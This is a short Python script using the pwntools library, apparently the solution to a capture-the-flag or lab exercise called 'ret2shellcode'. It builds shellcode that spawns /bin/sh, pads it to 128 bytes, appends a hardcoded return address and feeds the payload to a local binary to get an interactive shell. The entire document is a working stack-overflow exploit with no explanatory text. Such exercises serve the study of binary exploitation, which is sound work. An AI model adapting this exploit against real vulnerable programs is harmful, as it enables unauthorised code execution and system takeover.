from pwn import *

buf2_addr = 0x0804A080
shellcode = asm(shellcraft.sh())
print('shellcode length: {}'.format(len(shellcode)))
shellcode = shellcode.ljust(128, b'A')

sh = process('./ret2shellcode')
sh.sendline(shellcode + p32(buf2_addr))
sh.interactive()